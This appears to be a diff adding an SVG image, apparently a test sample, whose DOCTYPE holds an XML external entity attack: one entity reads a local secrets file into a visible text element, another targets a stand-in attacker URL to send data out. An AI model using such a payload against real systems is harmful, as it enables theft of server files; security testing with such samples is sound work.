@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"[
+    <!ENTITY xxe SYSTEM "file:///local/path/to/secrets.txt">
+    <!ENTITY exfil SYSTEM 'http://attackerurl.com/?x=%file;'>
+    <!ENTITY xeimage SYSTEM 'https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/410.svg'>
+    <!ENTITY st0 "fill:#BF0D0B;stroke-width:5;">
+	<!ENTITY st1 "fill:#F8E81F;stroke-width:5;">
+	<!ENTITY st2 "fill:#F7B71B;stroke-width:5;">
+	<!ENTITY st3 "fill-rule:nonzero;clip-rule:nonzero;stroke:#000000;stroke-miterlimit:4;">
+	<!ENTITY st4 "fill:#C5E41E;stroke-width:5;"> ]>
+<svg width="422.5pt" height="425pt" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <g id="group1" style="&st3;">
+    <path style="&st0;" d="M122.5,61.25c0,32.447-26.863,58.75-60,58.75s-60-26.303-60-58.75S29.363,2.5,62.5,2.5s60,26.303,60,58.75z" />
+    <path style="&st2;" d="M170,103.75c0,33.828-27.982,61.25-62.5,61.25S45,137.578,45,103.75S72.982,42.5,107.5,42.5S170,69.922,170,103.75z" />
+    <path style="&st1;" d="M282.5,190c0,49.706-37.496,90-83.75,90S115, 239.706,115,190s37.496-90,83.75-90s83.75,40.294,83.75,90z" />
+    <path style="&st4;" d="M420,316.25c0,58.681-50.368,106.25-112.5,106.25S195,374.931,195,316.25C195,257.57,245.368,210,307.5,210S420,257.57,420,316.25z" />
+  </g>
+  <text id="secret1" font-size="16" x="0" y="16">&xxe;</text>
+  <text id="secret2" font-size="48pt" x="32" y="220">Hello, XXE</text>
+  <image x="90" y="180" width="128" height="146" xlink:href="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/410.svg"/>
+</svg>
